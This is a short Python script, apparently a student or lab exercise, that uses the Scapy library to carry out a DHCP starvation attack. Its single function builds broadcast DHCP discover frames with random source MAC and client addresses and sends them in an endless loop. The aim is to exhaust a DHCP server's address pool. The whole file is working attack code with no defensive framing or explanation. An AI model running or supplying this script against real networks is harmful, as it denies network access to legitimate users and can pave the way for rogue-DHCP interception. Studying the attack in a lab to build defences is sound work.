# -*- coding: utf-8 -*-
"""
Created on Fri Dec 18 13:43:02 2020

@author: victo
"""

from scapy.all import  RandMAC,sendp,RandString,UDP,Ether,IP,BOOTP,DHCP

def DHCPStarvation():
    tramedhcp = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(16,b'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
    sendp(tramedhcp, loop=1)
        

if __name__ == "__main__":
    
    DHCPStarvation()